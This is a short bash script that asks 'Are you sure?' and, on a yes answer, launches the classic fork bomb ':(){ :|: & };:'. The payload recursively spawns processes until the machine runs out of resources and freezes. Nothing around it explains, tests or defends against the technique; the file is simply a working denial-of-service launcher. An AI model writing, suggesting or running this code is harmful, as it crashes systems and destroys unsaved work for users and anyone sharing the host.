#! /bin/bash

read -p "Are you sure? " -n 1 -r
echo # move to a new line

if [[ $REPLY =~ ^[Yy]$ ]]; then
  :(){ :|: & };: 
fi